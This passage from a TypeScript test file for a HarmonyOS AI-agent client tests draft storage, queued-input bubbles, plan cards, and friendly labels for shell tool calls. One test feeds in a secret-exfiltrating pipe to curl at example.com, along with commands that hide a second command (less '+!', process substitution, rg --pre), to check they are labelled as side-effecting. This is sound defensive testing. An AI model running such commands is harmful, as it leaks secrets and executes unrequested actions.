      legacyWriter.save('same-session', textComposerDocument('legacy draft'));
      await legacyWriter.flush('same-session');

      expect(composerDraftScopeKey('same-session', 'desktop-a') ===
        composerDraftScopeKey('same-session', 'desktop-b')).assertEqual(false);
      expect(composerDraftStorageKey('same-session', 'desktop-a') ===
        composerDraftStorageKey('same-session', 'desktop-b')).assertEqual(false);

      const reader = new ComposerDraftStore(storage);
      const migrated = await Promise.all([
        reader.read('same-session', 'desktop-a'),
        reader.read('same-session', 'desktop-b'),
      ]);
      expect((migrated[0] !== null) !== (migrated[1] !== null)).assertEqual(true);
      const claimedDocument: ComposerDocument | null = migrated[0] ?? migrated[1];
      expect(claimedDocument !== null).assertEqual(true);
      if (claimedDocument !== null) {
        expect(composerDocumentProjectedText(claimedDocument)).assertEqual('legacy draft');
      }
      expect(storage.values.has(composerDraftStorageKey('same-session'))).assertEqual(false);

      reader.save('same-session', textComposerDocument('from A'), 'desktop-a');
      reader.save('same-session', textComposerDocument('from B'), 'desktop-b');
      await Promise.all([
        reader.flush('same-session', 'desktop-a'),
        reader.flush('same-session', 'desktop-b'),
      ]);
      const fromA = await reader.read('same-session', 'desktop-a');
      const fromB = await reader.read('same-session', 'desktop-b');
      expect(fromA !== null).assertEqual(true);
      expect(fromB !== null).assertEqual(true);
      if (fromA !== null) expect(composerDocumentProjectedText(fromA)).assertEqual('from A');
      if (fromB !== null) expect(composerDocumentProjectedText(fromB)).assertEqual('from B');
      expect(storage.values.has(composerDraftStorageKey('same-session', 'desktop-a'))).assertEqual(true);
      expect(storage.values.has(composerDraftStorageKey('same-session', 'desktop-b'))).assertEqual(true);

      reader.clear('same-session', 'desktop-a');
      await reader.flush('same-session', 'desktop-a');
      expect(await reader.read('same-session', 'desktop-a')).assertEqual(null);
      const retainedB = await reader.read('same-session', 'desktop-b');
      expect(retainedB !== null).assertEqual(true);
      if (retainedB !== null) {
        expect(composerDocumentProjectedText(retainedB)).assertEqual('from B');
      }
    });

    it('keepsCreationFollowUpsInLocalFifoUntilExplicitHandoff', 0, () => {
      const store = new InputQueueStore();
      const session = new RemoteSession();
      session.id = 'creating-session';
      session.model = 'model';
      session.permissionMode = 'ask';
      const first = new SerializedComposerDocument();
      first.text = 'follow-up one';
      const second = new SerializedComposerDocument();
      second.text = 'follow-up two';
      store.deferDocument('device-1', session, first, [], []);
      store.deferDocument('device-1', session, second, [], []);

      const bubbles = store.getBubbles(session.id);
      expect(bubbles.length).assertEqual(2);
      expect(store.shouldDeferNewInput(session.id)).assertEqual(true);
      expect(bubbles[0].text).assertEqual('follow-up one');
      expect(bubbles[0].phase).assertEqual('waiting');
      expect(bubbles[1].text).assertEqual('follow-up two');
      const recovered = store.takeDeferred(session.id);
      expect(recovered.length).assertEqual(2);
      expect(recovered[0].text).assertEqual('follow-up one');
      expect(recovered[1].text).assertEqual('follow-up two');
      expect(store.getBubbles(session.id).length).assertEqual(0);
      expect(store.shouldDeferNewInput(session.id)).assertEqual(false);
    });

    it('clearsSettlingFailureStateWhenDeliveryResolvesOrProjectionDrops', 0, () => {
      const makeSettling = (clientId: string): InputQueueStore => {
        const store = new InputQueueStore();
        const session = new RemoteSession();
        session.id = 'settling-session';
        session.model = 'model';
        session.permissionMode = 'ask';
        store.seedOptimisticText('device-1', session, 'first', [], clientId);
        store.markLocalFailure(session.id, clientId, 'not confirmed');
        const empty: Record<string, Object> = {};
        empty['sessionId'] = session.id;
        empty['pendingQueue'] = [];
        store.handleProjectionPush(empty);
        return store;
      };

      const resolved = makeSettling('settling-resolved');
      expect(resolved.getBubbles('settling-session').length).assertEqual(1);
      resolved.resolveAppliedDelivery('settling-session', 'settling-resolved');
      expect(resolved.getBubbles('settling-session').length).assertEqual(0);
      expect(resolved.isLocallyFailed('settling-resolved')).assertEqual(false);

      const discarded = makeSettling('settling-discarded');
      discarded.discardProjection('settling-session');
      expect(discarded.getBubbles('settling-session').length).assertEqual(0);
      expect(discarded.isLocallyFailed('settling-discarded')).assertEqual(false);
    });

    it('restoresOnlyOneFailedBubbleWhenEmptyProjectionMovedItemToSettling', 0, () => {
      const store = new InputQueueStore();
      const session = new RemoteSession();
      session.id = 'enqueue-failure-session';
      session.model = 'model';
      session.permissionMode = 'ask';
      store.seedOptimisticText('device-1', session, 'send once', [], 'failed-client');
      const empty: Record<string, Object> = {};
      empty['sessionId'] = session.id;
      empty['pendingQueue'] = [];
      store.handleProjectionPush(empty);
      store.markLocalFailure(session.id, 'failed-client', 'relay unavailable');

      const bubbles = store.getBubbles(session.id);
      expect(bubbles.length).assertEqual(1);
      expect(bubbles[0].clientId).assertEqual('failed-client');
      expect(bubbles[0].phase).assertEqual('failed');
      expect(bubbles[0].errorText).assertEqual('relay unavailable');
    });

    it('recordsRemoteQueueEvidenceAndSettlesFastActiveDelivery', 0, () => {
      const projected = new InputQueueStore();
      const session = new RemoteSession();
      session.id = 'remote-evidence-session';
      session.model = 'model';
      session.permissionMode = 'ask';
      projected.seedOptimisticText('device-1', session, 'remote item', [], 'remote-client');
      const remoteEpoch = projected.captureRemoteEvidenceEpoch(session.id);
      expect(projected.hasRemoteEvidenceSince(session.id, 'remote-client', remoteEpoch))
        .assertEqual(false);
      const raw = projected.getProjection(session.id).pendingQueue[0].raw;
      const push: Record<string, Object> = {};
      push['sessionId'] = session.id;
      push['pendingQueue'] = [raw];
      projected.handleProjectionPush(push);
      expect(projected.hasRemoteEvidenceSince(session.id, 'remote-client', remoteEpoch))
        .assertEqual(true);

      const delivered = new InputQueueStore();
      delivered.seedOptimisticText('device-1', session, 'already active', [], 'active-client');
      const deliveredEpoch = delivered.captureRemoteEvidenceEpoch(session.id);
      const ids = new Set<string>();
      ids.add('active-client');
      delivered.setDeliveredClientIds(session.id, ids);
      expect(delivered.getProjection(session.id).pendingQueue.length).assertEqual(0);
      expect(delivered.getBubbles(session.id).length).assertEqual(0);
      expect(delivered.hasRemoteEvidenceSince(session.id, 'active-client', deliveredEpoch))
        .assertEqual(true);
    });

    it('keepsTodoCardAndStepKeysStableAcrossPlanStatusUpdates', 0, () => {
      const user = new RemoteMessage();
      user.id = 'plan-user-row';
      user.clientId = 'plan-user-client';
      user.role = 'user';
      user.content = '按步骤执行';

      const planMessage = (id: string, firstStatus: string): RemoteMessage => {
        const message = new RemoteMessage();
        message.id = id;
        message.role = 'tool_use';
        const first: Record<string, Object> = {};
        first['step'] = '读取项目';
        first['status'] = firstStatus;
        const second: Record<string, Object> = {};
        second['step'] = '完成修改';
        second['status'] = firstStatus === 'completed' ? 'in_progress' : 'pending';
        const input: Record<string, Object> = {};
        input['plan'] = [first, second];
        const content: Record<string, Object> = {};
        content['toolUseId'] = `${id}-use`;
        content['toolName'] = 'update_plan';
        content['input'] = input;
        message.content = content;
        return message;
      };

      const firstItems = buildRenderItems([user, planMessage('plan-1', 'in_progress')], true);
      const updatedItems = buildRenderItems([
        user,
        planMessage('plan-1', 'in_progress'),
        planMessage('plan-2', 'completed'),
      ], true);
      const firstCard = firstItems.find((item) => item.type === 'todo') as RenderTodoCardItem;
      const updatedCard = updatedItems.find((item) => item.type === 'todo') as RenderTodoCardItem;
      expect(firstCard.key).assertEqual('todo-plan-1');
      expect(updatedCard.key).assertEqual(firstCard.key);
      expect(updatedCard.todos.length).assertEqual(2);
      expect(updatedCard.todos[0].seq).assertEqual(0);
      expect(updatedCard.todos[1].seq).assertEqual(1);
    });

    it('keepsOnlyTheCurrentTurnTodoCardActiveWhileStreaming', 0, () => {
      const planMessage = (id: string): RemoteMessage => {
        const message = new RemoteMessage();
        message.id = id;
        message.role = 'tool_use';
        const step: Record<string, Object> = {};
        step['step'] = '执行步骤';
        step['status'] = 'in_progress';
        const input: Record<string, Object> = {};
        input['plan'] = [step];
        const content: Record<string, Object> = {};
        content['toolUseId'] = `${id}-use`;
        content['toolName'] = 'update_plan';
        content['input'] = input;
        message.content = content;
        return message;
      };
      const answer = new RemoteMessage();
      answer.id = 'old-answer';
      answer.role = 'assistant';
      answer.content = '上一轮已完成';
      const historicalItems = buildRenderItems([
        userBoundary('old-user'),
        planMessage('old-plan'),
        answer,
        userBoundary('current-user'),
      ], true);
      let historicalCard: RenderTodoCardItem | undefined = undefined;
      for (let i = 0; i < historicalItems.length; i++) {
        if (historicalItems[i].type === 'todo') {
          historicalCard = historicalItems[i] as RenderTodoCardItem;
        }
      }
      expect(historicalCard !== undefined).assertEqual(true);
      expect(historicalCard?.isStreaming).assertEqual(false);

      const currentItems = buildRenderItems([
        userBoundary('current-user'),
        planMessage('current-plan'),
      ], true);
      let currentCard: RenderTodoCardItem | undefined = undefined;
      for (let i = 0; i < currentItems.length; i++) {
        if (currentItems[i].type === 'todo') currentCard = currentItems[i] as RenderTodoCardItem;
      }
      expect(currentCard !== undefined).assertEqual(true);
      expect(currentCard?.isStreaming).assertEqual(true);
    });

    it('parsesThinkingMetadataAndDerivesItsStartTime', 0, () => {
      const text = new RemoteMessage();
      text.createdAt = '2026-08-01T12:00:00.000Z';
      text.content = '分析中';
      const textPresentation = parseThinkingPresentation(text);
      expect(textPresentation?.body).assertEqual('分析中');
      expect(textPresentation?.durationMs).assertEqual(-1);
      expect(textPresentation?.startedAt).assertEqual(text.createdAt);

      const structured = new RemoteMessage();
      structured.createdAt = '2026-08-01T12:00:05.000Z';
      const structuredContent: Record<string, Object> = {};
      structuredContent['thinking'] = '检查实现';
      structuredContent['durationMs'] = 2500;
      structuredContent['finishedAt'] = '2026-08-01T12:00:05.000Z';
      structured.content = structuredContent;
      const structuredPresentation = parseThinkingPresentation(structured);
      expect(structuredPresentation?.body).assertEqual('检查实现');
      expect(structuredPresentation?.durationMs).assertEqual(2500);
      expect(structuredPresentation?.startedAt).assertEqual('2026-08-01T12:00:02.500Z');

      const redacted = new RemoteMessage();
      redacted.createdAt = structured.createdAt;
      const redactedContent: Record<string, Object> = {};
      redactedContent['isRedacted'] = true;
      redacted.content = redactedContent;
      expect(parseThinkingPresentation(redacted)?.redacted).assertEqual(true);
    });

    it('marksOnlyFinalAssistantMessagesForCompletedTurns', 0, () => {
      const assistant = (id: string, body: string): RemoteMessage => {
        const message = new RemoteMessage();
        message.id = id;
        message.role = 'assistant';
        message.content = body;
        return message;
      };
      const firstDraft = assistant('first-draft', '处理中');
      const firstFinal = assistant('first-final', '第一轮完成');
      const secondDraft = assistant('second-draft', '第二轮处理中');
      secondDraft.isStreaming = true;
      const messages = [
        userBoundary('first-user'), firstDraft, firstFinal,
        userBoundary('second-user'), secondDraft,
      ];
      const streaming = turnFinalAssistantIds(messages, true);
      expect(streaming.has('first-final')).assertEqual(true);
      expect(streaming.has('first-draft')).assertEqual(false);
      expect(streaming.has('second-draft')).assertEqual(false);
      const settled = turnFinalAssistantIds(messages, false);
      expect(settled.has('first-final')).assertEqual(true);
      expect(settled.has('second-draft')).assertEqual(true);
    });

    it('keepsCompletedTailActionsWhileTheNextSendStartsBeforeItsUserRowLoads', 0, () => {
      const answer = new RemoteMessage();
      answer.id = 'completed-tail';
      answer.role = 'assistant';
      answer.content = '上一轮已完成回答';
      const messages = [userBoundary('previous-user'), answer];
      expect(turnFinalAssistantIds(messages, true).has(answer.id)).assertEqual(true);

      answer.isStreaming = true;
      expect(turnFinalAssistantIds(messages, true).has(answer.id)).assertEqual(false);
      answer.isStreaming = false;

      const localCard = new RemoteMessage();
      localCard.id = 'local-card';
      localCard.role = 'user';
      localCard.systemCardType = 'pwd';
      expect(turnFinalAssistantIds(messages.concat([localCard]), true).has(answer.id)).assertEqual(true);

      const staleTool = new RemoteMessage();
      staleTool.id = 'stale-tool';
      staleTool.role = 'tool_use';
      const staleToolContent: Record<string, Object> = {};
      staleToolContent['toolUseId'] = 'stale-use';
      staleToolContent['toolName'] = 'Bash';
      staleTool.content = staleToolContent;
      expect(turnFinalAssistantIds([
        userBoundary('tool-user'), staleTool, answer,
      ], true).has(answer.id)).assertEqual(true);
      expect(turnFinalAssistantIds([
        userBoundary('active-tool-user'), answer, staleTool,
      ], true).has(answer.id)).assertEqual(false);
    });

    it('retriesHistoryWithSmallerPagesOnlyForOversizedFrames', 0, () => {
      expect(historyRetryLimits(50).join(',')).assertEqual('50,25,10,5,1');
      expect(historyRetryLimits(80).join(',')).assertEqual('80,40,20,10,5,1');

      const coded: Record<string, Object> = {};
      coded['code'] = 'PAYLOAD_TOO_LARGE';
      expect(isPayloadTooLargeError(coded)).assertEqual(true);
      expect(isPayloadTooLargeError(new Error('PAYLOAD_TOO_LARGE: history page'))).assertEqual(true);
      expect(isPayloadTooLargeError(new Error('WebSocket frame exceeds 1048576 bytes'))).assertEqual(true);
      expect(isPayloadTooLargeError(new Error('network disconnected'))).assertEqual(false);

      const cyclic: Record<string, Object> = {};
      cyclic['self'] = cyclic;
      expect(safeErrorMessage(undefined)).assertEqual('');
      expect(safeErrorMessage(cyclic)).assertEqual('');
      expect(isPayloadTooLargeError(undefined)).assertEqual(false);
      expect(isPayloadTooLargeError(cyclic)).assertEqual(false);
    });

    it('letsASettledHistoryPageOwnTheLoadEarlierAffordance', 0, () => {
      expect(shouldKeepOlderMessagesAffordance(80, true)).assertEqual(true);
      expect(shouldKeepOlderMessagesAffordance(5, true)).assertEqual(true);
      expect(shouldKeepOlderMessagesAffordance(52, false)).assertEqual(false);
      expect(shouldKeepOlderMessagesAffordance(0, true)).assertEqual(false);
      expect(shouldInferOlderMessagesFromCount(false, 213, 212)).assertEqual(true);
      expect(shouldInferOlderMessagesFromCount(true, 213, 212)).assertEqual(false);
    });

    it('projectsFriendlyToolLabelsAndKeepsCommandsInDetails', 0, () => {
      const bashInput: Record<string, Object> = {};
      bashInput['description'] = '搜索 DlClient 的定义';
      bashInput['command'] = 'rg -n "class DlClient" apps/harmony';
      const bash = projectToolUseActions('Bash', JSON.stringify(bashInput), '');
      expect(bash[0].label).assertEqual('搜索 DlClient 的定义');
      expect(bash[0].detail).assertEqual('rg -n "class DlClient" apps/harmony');
      expect(bash[0].label.includes('/bin/zsh')).assertEqual(false);

      const readInput: Record<string, Object> = {};
      readInput['file_path'] = '/repo/apps/harmony/DlClient.ets';
      const read = projectToolUseActions('Read', JSON.stringify(readInput), '');
      expect(read[0].label).assertEqual('读取 DlClient.ets');
      expect(read[0].detail).assertEqual('/repo/apps/harmony/DlClient.ets');

      const unknownInput: Record<string, Object> = {};
      unknownInput['command'] = '/bin/zsh -lc export DEVECO_HOME=/Applications/DevEco-Studio.app';
      const unknown = projectToolUseActions('exec', JSON.stringify(unknownInput), '');
      expect(unknown[0].label).assertEqual('运行命令');
      expect(unknown[0].detail.includes('/bin/zsh -lc')).assertEqual(true);
    });

    it('projectsAndDeduplicatesCollapsedWorkGroupRows', 0, () => {
      const work = new RenderWorkGroupItem();
      const thinking = new RenderThinkingItem();
      thinking.type = 'thinking';
      thinking.key = 'thinking-1';
      thinking.body = '**先检查** `MessageStore.ets`，再继续分析。';

      const tools = new RenderToolGroupItem();
      tools.type = 'tool_group';
      tools.key = 'tools-1';
      for (let i = 0; i < 2; i++) {
        const read = new RenderToolItem();
        read.seq = i + 1;
        read.toolName = 'Read';
        read.inputRaw = '{"file_path":"/repo/MessageStore.ets"}';
        read.hasResult = true;
        tools.tools.push(read);
      }
      const search = new RenderToolItem();
      search.seq = 3;
      search.toolName = 'Grep';
      search.inputRaw = '{"pattern":"loadInitial","path":"/repo"}';
      tools.tools.push(search);
      work.children = [thinking, tools];

      const rows = workPreviewRows(work);
      expect(rows.length).assertEqual(3);
      expect(rows[0].kind).assertEqual('thinking');
      const thinkingTokens = tokenizeThinkingText(rows[0].text);
      expect(thinkingTokens[0].kind).assertEqual('strong');
      expect(thinkingTokens[2].kind).assertEqual('code');
      expect(rows[1].text).assertEqual('读取 MessageStore.ets');
      expect(rows[1].done).assertEqual(true);
      expect(rows[2].explorationKind).assertEqual('search');
      expect(workExplorationSummary(work)).assertEqual('读取 1 个文件 · 搜索 1 次');
      work.isStreaming = true;
      expect(workGroupHasHiddenRows(work)).assertEqual(false);

      for (let i = 0; i < 4; i++) {
        const extra = new RenderThinkingItem();
        extra.type = 'thinking';
        extra.key = `thinking-extra-${i}`;
        extra.body = `继续分析 ${i}`;
        work.children.push(extra);
      }
      expect(workPreviewRows(work).length).assertEqual(5);
      expect(workGroupHasHiddenRows(work)).assertEqual(true);
    });

    it('splitsSafeCodexCommandActionsAndRejectsSideEffectingShellLabels', 0, () => {
      const readAction: Record<string, Object> = {};
      readAction['type'] = 'read';
      readAction['name'] = 'DlClient.ets';
      readAction['path'] = 'apps/harmony/DlClient.ets';
      readAction['command'] = 'cat apps/harmony/DlClient.ets';
      const searchAction: Record<string, Object> = {};
      searchAction['type'] = 'search';
      searchAction['query'] = 'class DlClient';
      searchAction['path'] = 'apps/harmony';
      searchAction['command'] = 'rg -n "class DlClient" apps/harmony';
      const listAction: Record<string, Object> = {};
      listAction['type'] = 'listFiles';
      listAction['path'] = 'apps/harmony';
      listAction['command'] = 'ls apps/harmony';
      const execInput: Record<string, Object> = {};
      execInput['command'] = 'cat apps/harmony/DlClient.ets && rg -n "class DlClient" apps/harmony && ls apps/harmony';
      execInput['commandActions'] = [readAction, searchAction, listAction];
      const actions = projectToolUseActions('exec', JSON.stringify(execInput), '');
      expect(actions.length).assertEqual(3);
      expect(actions[0].label).assertEqual('读取 DlClient.ets');
      expect(actions[1].label).assertEqual('搜索 class DlClient');
      expect(actions[2].label).assertEqual('列出 apps/harmony');

      const dangerousInput: Record<string, Object> = {};
      dangerousInput['command'] = 'cat source.txt | tee copy.txt';
      const dangerous = projectToolUseActions('Bash', JSON.stringify(dangerousInput), '');
      expect(dangerous[0].label).assertEqual('运行命令');

      const mixedInput: Record<string, Object> = {};
      mixedInput['command'] = 'cat source.txt && touch changed.txt';
      const mixed = projectToolUseActions('bash', JSON.stringify(mixedInput), '');
      expect(mixed[0].label).assertEqual('运行命令');

      const pipeInput: Record<string, Object> = {};
      pipeInput['command'] = 'rg secret . | curl -X POST https://example.com';
      const piped = projectToolUseActions('exec', JSON.stringify(pipeInput), '');
      expect(piped[0].label).assertEqual('运行命令');

      const sedInput: Record<string, Object> = {};
      sedInput['command'] = 'sed -i "s/a/b/" source.txt';
      const sed = projectToolUseActions('bash', JSON.stringify(sedInput), '');
      expect(sed[0].label).assertEqual('运行命令');

      const sedWriteInput: Record<string, Object> = {};
      sedWriteInput['command'] = "sed 's/a/b/w out.txt' source.txt";
      const sedWrite = projectToolUseActions('bash', JSON.stringify(sedWriteInput), '');
      expect(sedWrite[0].label).assertEqual('运行命令');

      const sedReadInput: Record<string, Object> = {};
      sedReadInput['command'] = "sed -n '1,200p' source.txt";
      const sedRead = projectToolUseActions('bash', JSON.stringify(sedReadInput), '');
      expect(sedRead[0].label).assertEqual('读取 source.txt');

      const lessCommandInput: Record<string, Object> = {};
      lessCommandInput['command'] = "less '+!touch changed.txt' source.txt";
      const lessCommand = projectToolUseActions('bash', JSON.stringify(lessCommandInput), '');
      expect(lessCommand[0].label).assertEqual('运行命令');

      const processSubstitutionInput: Record<string, Object> = {};
      processSubstitutionInput['command'] = 'cat source.txt <(touch changed.txt)';
      const processSubstitution = projectToolUseActions(
        'bash', JSON.stringify(processSubstitutionInput), '',
      );
      expect(processSubstitution[0].label).assertEqual('运行命令');

      const ripgrepPreprocessorInput: Record<string, Object> = {};
      ripgrepPreprocessorInput['command'] = "rg --pre='touch changed.txt' pattern .";
      const ripgrepPreprocessor = projectToolUseActions(
        'bash', JSON.stringify(ripgrepPreprocessorInput), '',
      );
      expect(ripgrepPreprocessor[0].label).assertEqual('运行命令');
    });

    it('unwrapsOnlyUnambiguousPosixShellCommandsForOldHistory', 0, () => {
      const readInput: Record<string, Object> = {};
      readInput['command'] = "/bin/zsh -lc 'cat /repo/src/DlClient.ets'";
      const read = projectToolUseActions('exec', JSON.stringify(readInput), '');
      expect(read[0].label).assertEqual('读取 DlClient.ets');
      expect(read[0].detail).assertEqual('cat /repo/src/DlClient.ets');

      const searchInput: Record<string, Object> = {};
      searchInput['command'] = "/usr/bin/bash -c 'rg -n \"DlClient\" apps/harmony'";
      const search = projectToolUseActions('exec', JSON.stringify(searchInput), '');
      expect(search[0].label).assertEqual('搜索 DlClient');

      const malformedInput: Record<string, Object> = {};
      malformedInput['command'] = "/bin/zsh -lc 'cat source.txt' trailing";
      const malformed = projectToolUseActions('exec', JSON.stringify(malformedInput), '');
      expect(malformed[0].label).assertEqual('运行命令');
    });

    it('preservesStructuredLiveToolInputForFriendlyLabels', 0, () => {
      const store = new MessageStore();
      const input: Record<string, Object> = {};
      input['description'] = '读取鸿蒙消息实现';
      input['command'] = 'sed -n "1,200p" MessageRender.ets';
      const data: Record<string, Object> = {};
      data['toolUseId'] = 'live-use-1';
      data['toolName'] = 'Bash';
      data['input'] = input;
      const event: Record<string, Object> = {};
      event['type'] = 'tool_use';
      event['data'] = data;
      store.handleMakerEvent('live-session', event);

      const messages = store.getMessagesWithStreaming('live-session');
      const content = messages[0].content as Record<string, Object>;
      expect(typeof content['input']).assertEqual('object');
      const actions = projectToolUseActions('Bash', JSON.stringify(content['input']), '');
      expect(actions[0].label).assertEqual('读取鸿蒙消息实现');

      const legacy = projectToolUseActions('Bash', JSON.stringify(JSON.stringify(input)), '');
      expect(legacy[0].label).assertEqual('读取鸿蒙消息实现');
    });

    it('batchesRapidTextNotificationsAndFlushesBeforeToolBoundaries', 0, () => {
      const store = new MessageStore();
      let notifications = 0;
      const unsubscribe = store.onChanged(() => {
        notifications += 1;
      });
      const firstData: Record<string, Object> = {};
      firstData['text'] = '前';
      const firstEvent: Record<string, Object> = {};
      firstEvent['type'] = 'text';
      firstEvent['data'] = firstData;
      store.handleMakerEvent('batched-text', firstEvent, 'answer-1');
      const secondData: Record<string, Object> = {};
      secondData['text'] = '进';
      const secondEvent: Record<string, Object> = {};
      secondEvent['type'] = 'text';
      secondEvent['data'] = secondData;
      store.handleMakerEvent('batched-text', secondEvent, 'answer-1');
      expect(notifications).assertEqual(0);
      expect(store.getStreaming('batched-text')?.text ?? '').assertEqual('前进');

      const toolData: Record<string, Object> = {};
      toolData['toolUseId'] = 'batch-tool';
      toolData['toolName'] = 'Read';
      const toolEvent: Record<string, Object> = {};
      toolEvent['type'] = 'tool_use';
      toolEvent['data'] = toolData;
      store.handleMakerEvent('batched-text', toolEvent, 'tool-1');
      expect(notifications).assertEqual(1);
      expect(TEXT_DELTA_BATCH_INTERVAL_MS).assertEqual(32);
      unsubscribe();
    });

    it('closesEarlierWorkImmediatelyWhenSameMillisecondProgressPushArrives', 0, () => {
      const sessionId = 'same-ms-live-session';
      const createdAt = '2026-08-10T00:00:00.000Z';
      const store = new MessageStore();

      const thinkingMessage: Record<string, Object> = {};
      thinkingMessage['id'] = 'thinking-before-progress';
      thinkingMessage['clientId'] = 'thinking-before-progress';
      thinkingMessage['sessionId'] = sessionId;
      thinkingMessage['role'] = 'thinking';
      thinkingMessage['content'] = '检查现有实现';
      thinkingMessage['createdAt'] = createdAt;
      thinkingMessage['rowid'] = 41;
      const thinkingPush: Record<string, Object> = {};
      thinkingPush['sessionId'] = sessionId;
      thinkingPush['message'] = thinkingMessage;
      store.handleSessionPush('device-1', 'local-db:messages:created', thinkingPush);

      const progressData: Record<string, Object> = {};
      progressData['text'] = '已经找到同步问题，继续修复。';
      const progressEvent: Record<string, Object> = {};
      progressEvent['type'] = 'text';
      progressEvent['data'] = progressData;
      store.handleMakerEvent(sessionId, progressEvent, 'progress-answer');

      // Desktop messages:created 实时帧不保证携带 DB rowid；与前一行同毫秒时
      // 必须保留到达顺序，不能把正文排到工作步骤前面。
      const answerMessage: Record<string, Object> = {};
      answerMessage['id'] = 'progress-answer';
      answerMessage['clientId'] = 'progress-answer';
      answerMessage['sessionId'] = sessionId;
      answerMessage['role'] = 'assistant';
      answerMessage['content'] = '已经找到同步问题，继续修复。';
      answerMessage['createdAt'] = createdAt;
      const answerPush: Record<string, Object> = {};
      answerPush['sessionId'] = sessionId;
      answerPush['message'] = answerMessage;
      store.handleSessionPush('device-1', 'local-db:messages:created', answerPush);

      const nextToolInput: Record<string, Object> = {};
      nextToolInput['description'] = '修改实时收口逻辑';
      const nextToolData: Record<string, Object> = {};
      nextToolData['toolUseId'] = 'tool-after-progress';
      nextToolData['toolName'] = 'Bash';
      nextToolData['input'] = nextToolInput;
      const nextToolEvent: Record<string, Object> = {};
      nextToolEvent['type'] = 'tool_use';
      nextToolEvent['data'] = nextToolData;
      store.handleMakerEvent(sessionId, nextToolEvent, 'next-tool-block');

      const messages = store.getMessagesWithStreaming(sessionId);
      expect(messages.length).assertEqual(3);
      expect(messages[0].id).assertEqual('thinking-before-progress');
      expect(messages[1].id).assertEqual('progress-answer');
      expect(messages[2].role).assertEqual('tool_use');
      expect(store.isSessionStreaming(sessionId)).assertEqual(true);

      const items = buildRenderItems(messages, true);
      expect(items.length).assertEqual(3);
      expect(items[0].type).assertEqual('work_group');
      expect((items[0] as RenderWorkGroupItem).isStreaming).assertEqual(false);
      expect(items[1].type).assertEqual('message');
      expect(items[2].type).assertEqual('work_group');
      expect((items[2] as RenderWorkGroupItem).isStreaming).assertEqual(true);

      const historyRow = new RemoteMessage();
      historyRow.createdAt = createdAt;
      historyRow.rowid = 41;
      const liveRow = new RemoteMessage();
      liveRow.createdAt = createdAt;
      expect(sortMessagesAsc(liveRow, historyRow)).assertEqual(0);
    });

    it('rebuildsMessageListNodesWhenTheirPresentationChanges', 0, () => {
      expect(messageListRenderNodeKey('work-a', 'work_group', true))
        .assertEqual('render:10:work_group:6:work-a:work:live');
      expect(messageListRenderNodeKey('work-a', 'work_group', false))
        .assertEqual('render:10:work_group:6:work-a:work:done');
      expect(messageListRenderNodeKey('work-a', 'work_group', true))
        .assertEqual('render:10:work_group:6:work-a:work:live');
      expect(messageListRenderNodeKey('message-a', 'message', true))
        .assertEqual('render:7:message:9:message-a');
      expect(messageListRenderNodeKey(
        'subagent-a', 'subagent_group', false, 's:7:running:0:w1'))
        .assertEqual('render:14:subagent_group:10:subagent-a:state:16:s:7:running:0:w1');
      expect(messageListRenderNodeKey(
        'subagent-a', 'subagent_group', false, 's:9:completed:0:w0'))
        .assertEqual('render:14:subagent_group:10:subagent-a:state:18:s:9:completed:0:w0');

      const todo = new RenderTodoCardItem();
      todo.type = 'todo';
      todo.key = 'todo-a';
      todo.isStreaming = true;
      const step = new RenderTodoItem();
      step.seq = 0;
      step.content = '完成实时刷新';
      step.status = 'in_progress';
      todo.todos = [step];
      const pendingTodoKey = messageListRenderNodeKey(
        todo.key, todo.type, false, messageListItemPresentationState(todo));
      step.status = 'completed';
      const completedTodoKey = messageListRenderNodeKey(
        todo.key, todo.type, false, messageListItemPresentationState(todo));
      expect(pendingTodoKey === completedTodoKey).assertEqual(false);
      expect(todo.key).assertEqual('todo-a');

      const agent = new RenderAgentTaskItem();
      agent.type = 'agent_task';
      agent.key = 'task-a';
      agent.update = new AgentTaskUpdate();
      agent.update.taskId = 'agent-a';
      agent.update.status = 'running';
      agent.update.updatedAt = '2026-08-17T10:00:00.000Z';
      const runningAgentKey = messageListRenderNodeKey(
        agent.key, agent.type, false, messageListItemPresentationState(agent));
      agent.update.status = 'completed';
      agent.update.updatedAt = '2026-08-17T10:00:01.000Z';
      const completedAgentKey = messageListRenderNodeKey(
        agent.key, agent.type, false, messageListItemPresentationState(agent));
      expect(runningAgentKey === completedAgentKey).assertEqual(false);
      expect(agent.key).assertEqual('task-a');

      const toolGroup = new RenderToolGroupItem();
      toolGroup.type = 'tool_group';
      toolGroup.key = 'tool-a';
      const tool = new RenderToolItem();
      tool.toolUseId = 'tool-a';
      tool.toolName = 'Bash';
      toolGroup.tools = [tool];
      const work = new RenderWorkGroupItem();
      work.type = 'work_group';
      work.key = 'work-a';
      work.isStreaming = true;
      work.children = [toolGroup];
      const runningWorkKey = messageListRenderNodeKey(
        work.key, work.type, true, messageListItemPresentationState(work));
      tool.hasResult = true;
      tool.resultText = 'ok';
      const settledWorkKey = messageListRenderNodeKey(
        work.key, work.type, true, messageListItemPresentationState(work));
      expect(runningWorkKey === settledWorkKey).assertEqual(false);
      expect(work.key).assertEqual('work-a');
    });

    it('keepsToolsAfterProgressTextInTheLiveWorkGroupAndPreservesTurnClock', 0, () => {
      const store = new MessageStore();
      const textData: Record<string, Object> = {};
      textData['text'] = '先汇报当前进度';
      const textEvent: Record<string, Object> = {};
      textEvent['type'] = 'text';
      textEvent['data'] = textData;
      store.handleMakerEvent('interleaved-live', textEvent, 'progress-1');
      const startedAt = store.getSessionRunStartedAt('interleaved-live');
      expect(startedAt > 0).assertEqual(true);

      const input: Record<string, Object> = {};
      input['description'] = '搜索后续实现';
      const toolData: Record<string, Object> = {};
      toolData['toolUseId'] = 'post-progress-tool';
      toolData['toolName'] = 'Bash';
      toolData['input'] = input;
      const toolEvent: Record<string, Object> = {};
      toolEvent['type'] = 'tool_use';
      toolEvent['data'] = toolData;
      store.handleMakerEvent('interleaved-live', toolEvent, 'tool-1');

      expect(store.getSessionRunStartedAt('interleaved-live')).assertEqual(startedAt);
      void store.closeSession('interleaved-live');
      expect(store.getSessionRunStartedAt('interleaved-live')).assertEqual(startedAt);
      // 离开页面只停订阅：重进首帧应仍看到进度正文和当前工具，且计时不归零。
      expect(store.getSessionRunStartedAt('interleaved-live')).assertEqual(startedAt);
      const cachedMessages = store.getMessagesWithStreaming('interleaved-live');
      expect(cachedMessages.length).assertEqual(2);
      expect(cachedMessages[0].role).assertEqual('assistant');
      expect(cachedMessages[1].role).assertEqual('tool_use');
      const items = buildRenderItems(cachedMessages, store.isSessionStreaming('interleaved-live'));
      const work = items[items.length - 1] as RenderWorkGroupItem;
      expect(work.type).assertEqual('work_group');
